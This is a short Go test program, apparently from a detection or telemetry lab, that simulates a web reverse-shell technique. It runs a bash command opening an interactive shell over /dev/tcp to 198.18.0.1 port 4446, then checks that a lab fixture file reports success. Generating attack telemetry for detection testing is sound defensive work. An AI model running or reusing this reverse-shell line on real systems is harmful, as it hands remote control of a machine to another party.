package main
import (
"fmt"
"os/exec"
"github.com/michaellong/telemetry-lab/ttp-composite/linux/go/coverage/internal/fixture"
"os"
)
func main() {
if !fixture.Begin("web_reverse_shell") {return}
cmd := exec.Command("/bin/bash", "-c", "bash -i >& /dev/tcp/198.18.0.1/4446 0>&1")
data, err := cmd.Output(); fixture.Must(err)
fixture.Check(string(data) == "", "utility output")
got, err := os.ReadFile("/tmp/lab/received"); fixture.Must(err); fixture.Check(string(got) == "SHELL_OK", "fixture bytes")
fmt.Print("CASE_OK web_reverse_shell\n")
}
